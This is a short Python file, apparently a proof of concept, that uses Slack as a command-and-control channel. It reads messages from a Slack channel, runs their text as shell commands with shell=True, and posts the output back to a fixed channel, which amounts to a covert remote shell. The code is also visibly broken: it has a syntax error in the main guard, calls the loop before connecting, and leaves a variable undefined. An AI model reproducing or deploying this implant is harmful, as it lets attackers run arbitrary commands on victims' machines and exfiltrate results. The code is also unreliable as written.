import time
import json
import subprocess
from slackclient import SlackClient

'''
Very basic PoC of slack as c2. I will work on this more over the weekend.
'''


slack_token = ''

# Create SlackClient object named sc.
sc= SlackClient(slack_token)



def send_data(data):
    sc.api_call("chat.postMessage",
             channel="G9VV55NAH",
             text=data
)

def pull_commands():
    while True:
        raw_commands = sc.rtm_read() # Retuns a dictionary in a list.

        if len(raw_commands) > 0:
            # To remove the dictionary from the list
            str_raw_commands = raw_commands[0]

            if len(str_raw_commands) > 3:

                # Fix Json
                j = json.loads(str(str_raw_commands).replace("'",'"'))
                # Execute command
                try:
                    if j['username'] != 'testing':
                       # Will fail to find when message not from bot. When from bot, will not execute anyways...

                       # data = subprocess.run([j['text']], shell=True, stdout=subprocess.PIPE)

                        send_data(data.stdout)
                except:
                    data = subprocess.run([j['text']], shell=True, stdout=subprocess.PIPE)
                    send_data(data.stdout)


                #print('MESSAGE: ' + j['text'])
        time.sleep(.05)


pull_commands()


def main():
    # Basic connection vs rtm.start()
    print(sc.rtm_connect())
    pull_commands()

if __name__ = '__main__':
    main()
